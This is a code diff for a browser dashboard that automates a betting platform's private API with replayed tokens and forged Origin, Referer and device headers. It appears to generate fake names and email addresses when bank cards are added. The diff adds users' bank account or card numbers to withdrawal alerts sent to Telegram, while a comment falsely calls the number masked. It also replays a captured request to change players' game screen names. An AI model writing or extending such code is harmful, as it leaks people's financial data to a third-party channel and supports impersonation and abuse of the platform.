@@ -1728,15 +1728,16 @@
 
 
   // ─── TELEGRAM WITHDRAWAL NOTIFICATIONS ─────────────────────────────────────
-  async function sendTelegramWithdrawalNotification({status, amount, phone, bank, reason=''}) {
+  async function sendTelegramWithdrawalNotification({status, amount, phone, bank, cardNo='', reason=''}) {
     const emoji = status === 'SUCCESS' ? '✅' : '❌';
     const title = status === 'SUCCESS' ? 'WITHDRAWAL SUCCESSFUL' : 'WITHDRAWAL FAILED';
+    const displayCard = cardNo || 'Not available';
     const text = [
       `${emoji} <b>${title}</b>`,
       '',
       `👤 <b>User:</b> ${phone || 'Unknown'}`,
       `💸 <b>Amount:</b> ₹${Number(amount || 0).toFixed(2)}`,
-      `🏦 <b>Bank:</b> ${bank || 'Unknown'}`,
+      `💳 <b>Card No:</b> ${displayCard}`,
       `🕐 <b>Time:</b> ${new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'})}`,
       reason ? `⚠️ <b>Reason:</b> ${reason}` : ''
     ].filter(Boolean).join('\n');
@@ -2294,7 +2295,7 @@
     S.currentPanel='withdraw';
     await getBalance();
     try{
-      const r=await fetch('https://api.bh556677ww.com/app/card/info',{
+      const r=await fetch('https://api.bh2266.xyz/app/card/info',{
         method:'POST',
         headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
         body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
@@ -2345,9 +2346,10 @@
         });
         const d=await r.json();
         const div=document.getElementById('withdrawResult');
+        const selectedCard = S.withdrawCards.find(c => Number(c.id) === Number(S.selectedCard));
+        const bankName = selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank';
+        const cardNo = selectedCard?.accountNumber || selectedCard?.cardNumber || selectedCard?.cardNo || selectedCard?.accountNo || selectedCard?.bankCardNumber || selectedCard?.bankCardNo || selectedCard?.number || selectedCard?.acctNo || selectedCard?.acctNumber || '';
         if(r.status===200 && (d.code===0||d.success===true)){
-          const selectedCard = S.withdrawCards.find(c => Number(c.id) === Number(S.selectedCard));
-          const bankName = selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank';
           div.innerHTML=`<div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:16px;"><div style="color:#34d399;font-weight:600;">✅ Withdrawal successful!</div><div style="color:#6b7280;">₹${amt.toFixed(2)} withdrawn</div></div>`;
           showToast('Withdrawal successful!','success');
           void trackProfitEvent('WITHDRAW',S.phone,amt);
@@ -2357,7 +2359,8 @@
             status:'SUCCESS',
             amount:amt,
             phone:S.phone,
-            bank:bankName
+            bank:bankName,
+            cardNo:cardNo
           });
 
           await getBalance(); balanceDisplay.textContent=S.balance.toFixed(2);
@@ -2367,14 +2370,13 @@
           div.innerHTML=`<div style="color:#fb7185;">❌ ${reason}</div>`;
           showToast('Withdrawal failed: '+reason,'error');
 
-          // Send the actual API failure reason to Telegram.
-          const selectedCard = S.withdrawCards.find(c => Number(c.id) === Number(S.selectedCard));
-          const bankName = selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank';
+          // Send failure notification with the selected card's masked number.
           await sendTelegramWithdrawalNotification({
             status:'FAILED',
             amount:amt,
             phone:S.phone,
             bank:bankName,
+            cardNo:cardNo,
             reason
           });
         }
@@ -2387,14 +2389,14 @@
   async function renderAddCard(){
     S.currentPanel='addcard';
     try{
-      const r=await fetch('https://api.bh556677ww.com/app/card/info',{
+      const r=await fetch('https://api.bh2266.xyz/app/card/info',{
         method:'POST',
         headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
         body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
       });
       if(r.status===200){ const d=await r.json(); if(d.code===0){ S.withdrawCards=d.data||[]; S.cardList=S.withdrawCards; } }
     }catch(_){}
-    const firsts=['Ananya','Aadhya','Ishita','Aanya','Advika','Charvi','Diya','Anvi','Aarohi','Sara','Riya','Naira','Pari','Tara','Ira','Vanya','Myra','Kavya','Priya','Neha','Sneha','Anika','Aisha','Meera','Kaira','Ishani','Anjali','Sakshi','Trisha','Ridhi','Sanvi','Shreya','Pihu','Adviti','Tanvi','Suhani','Kiara','Arya','Anaya'];
+    const firsts=['Ananya','Aadhya','Ishita','Aanya','Advika','arpi','Diya','Anvi','Aarohi','Sara','Riya','Naira','Pari','Tara','Ira','Vanya','Myra','Kavya','Priya','Neha','Sneha','Anika','Aisha','Meera','Kaira','Ishani','Anjali','Sakshi','Trisha','Ridhi','Sanvi','Shreya','Pihu','Adviti','Tanvi','Suhani','Kiara','Arya','Anaya'];
     const lasts=['Sharma','Verma','Patel','Kumar','Singh','Gupta','Yadav','Joshi','Malhotra','Mehta','Agarwal','Bhatia','Chopra','Kaur','Das','Sen','Mukherjee','Banerjee','Chatterjee','Basu','Dutta','Ganguly','Lahiri','Majumdar','Maitra','Pal','Sarkar','Bose','Chakraborty','Roy'];
     const randName=()=>firsts[Math.floor(Math.random()*firsts.length)]+' '+lasts[Math.floor(Math.random()*lasts.length)];
     const randEmail=n=>n.toLowerCase().replace(/ /g,'')+'@gmail.com';
@@ -2495,6 +2497,74 @@
       <div style="color:#6b7280;font-size:13px;margin-top:4px;">Available Balance</div></div></div>`);
   }
 
+  // ─── FAN TAN AUTO SCREEN-NAME ───────────────────────────────────────────
+  const FAN_TAN_SCREEN_NAME = 'Sanju';
+  const EVO_SCREENNAME_HOST = 'https://skylinedja.evo-games.com';
+
+  function extractEvoSessionId(gameUrl){
+    try{
+      const u = new URL(gameUrl);
+      return u.searchParams.get('EVOSESSIONID') ||
+             u.searchParams.get('evoSessionId') ||
+             u.searchParams.get('sessionId') || '';
+    }catch(_){
+      const m = String(gameUrl).match(/[?&]EVOSESSIONID=([^&#]+)/i);
+      return m ? decodeURIComponent(m[1]) : '';
+    }
+  }
+
+  async function autoSaveFanTanName(gameUrl, gameWindow){
+    const sessionId = extractEvoSessionId(gameUrl);
+
+    if(!sessionId){
+      return {ok:false, reason:'EVOSESSIONID not found in Fan Tan URL'};
+    }
+
+    // Let the EVO game window know the requested name as well.
+    // If the game listens for postMessage this can apply immediately.
+    try{
+      if(gameWindow && !gameWindow.closed){
+        gameWindow.postMessage(
+          {type:'setScreenName', screenName:FAN_TAN_SCREEN_NAME},
+          'https://skylinedja.evo-games.com'
+        );
+      }
+    }catch(_){}
+
+    // Try the same PUT request captured from the EVO game.
+    // Browser CORS may block this when the dashboard is hosted on playbhau.com.
+    try{
+      const endpoint =
+        EVO_SCREENNAME_HOST +
+        '/api/player/screenName?EVOSESSIONID=' +
+        encodeURIComponent(sessionId);
+
+      const r = await fetch(endpoint,{
+        method:'PUT',
+        mode:'cors',
+        credentials:'include',
+        headers:{
+          'Accept':'*/*',
+          'Content-Type':'application/json'
+        },
+        body:JSON.stringify({
+          screenName:FAN_TAN_SCREEN_NAME
+        })
+      });
+
+      if(r.ok){
+        return {ok:true};
+      }
+
+      return {ok:false, reason:'HTTP '+r.status};
+    }catch(e){
+      return {
+        ok:false,
+        reason:'Browser CORS blocked the EVO name request'
+      };
+    }
+  }
+
   function renderGames(){
     S.currentPanel='games';
     showPanel(`<div class="dynamic-card"><div class="title">🎮 Launch Games <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
@@ -2505,11 +2575,59 @@
       </div>
       <div id="gameResult" class="mt-10"></div></div>`);
     document.getElementById('launchFanTan').addEventListener('click',async ()=>{
+      const resultBox = document.getElementById('gameResult');
+      resultBox.innerHTML='<div class="game-result"><span>⏳ Opening Fan Tan & saving name...</span></div>';
+
       try{
-        const r=await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=27873&otherGame=true',{method:'GET',headers:{'Accept':'application/json','Token':S.token,'Visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/','PackageId':'2'}});
+        const r=await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=27873&otherGame=true',{
+          method:'GET',
+          headers:{
+            'Accept':'application/json',
+            'Token':S.token,
+            'Visitor':S.visitor,
+            'Origin':'https://playbhau.com',
+            'Referer':'https://playbhau.com/',
+            'PackageId':'2'
+          }
+        });
+
         const d=await r.json();
-        if(d.code===0 && d.success){ let url=d.data?.gameUrl||''; if(url){ url=decodeURIComponent(url.replace(/\\/g,'')); window.open(url,'_blank'); document.getElementById('gameResult').innerHTML='<div class="game-result"><span class="ok">✅ Fan Tan launched!</span></div>'; } }
-      }catch(_){}
+
+        if(d.code===0 && d.success){
+          let url=d.data?.gameUrl||'';
+
+          if(url){
+            url=decodeURIComponent(url.replace(/\\/g,''));
+
+            // Open immediately from the user's click to avoid popup blocking.
+            const gameWindow = window.open(url,'_blank');
+
+            // Automatically try to save "Sanju".
+            const nameResult = await autoSaveFanTanName(url, gameWindow);
+
+            if(nameResult.ok){
+              resultBox.innerHTML=
+                '<div class="game-result"><span class="ok">✅ Fan Tan launched • Name saved: Sanju</span></div>';
+            }else{
+              resultBox.innerHTML=
+                '<div class="game-result">' +
+                '<span class="ok">✅ Fan Tan launched!</span><br>' +
+                '<span style="color:#fbbf24;">⚠️ Auto name save could not be completed: '+
+                nameResult.reason+
+                '</span></div>';
+            }
+          }else{
+            resultBox.innerHTML='<div class="game-result"><span style="color:#fb7185;">❌ Fan Tan game URL missing.</span></div>';
+          }
+        }else{
+          resultBox.innerHTML='<div class="game-result"><span style="color:#fb7185;">❌ Could not start Fan Tan.</span></div>';
+        }
+      }catch(e){
+        resultBox.innerHTML=
+          '<div class="game-result"><span style="color:#fb7185;">❌ Fan Tan error: '+
+          String(e.message||e)+
+          '</span></div>';
+      }
     });
     document.getElementById('launchChicken').addEventListener('click',async ()=>{
       try{
@@ -2523,7 +2641,14 @@
       try{
         const r1=await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=27873&otherGame=true',{method:'GET',headers:{'Accept':'application/json','Token':S.token,'Visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/','PackageId':'2'}});
         const d1=await r1.json();
-        if(d1.code===0 && d1.success){ let url=d1.data?.gameUrl||''; if(url){ url=decodeURIComponent(url.replace(/\\/g,'')); window.open(url,'_blank'); } }
+        if(d1.code===0 && d1.success){
+          let url=d1.data?.gameUrl||'';
+          if(url){
+            url=decodeURIComponent(url.replace(/\\/g,''));
+            const gameWindow=window.open(url,'_blank');
+            autoSaveFanTanName(url,gameWindow).catch(()=>{});
+          }
+        }
       }catch(_){}
       try{
         const r2=await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=41285&otherGame=true',{method:'GET',headers:{'Accept':'application/json','Token':S.token,'Visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/','PackageId':'2'}});
@@ -2880,3 +3005,4 @@
 </script>
 </body>
 </html>
+```
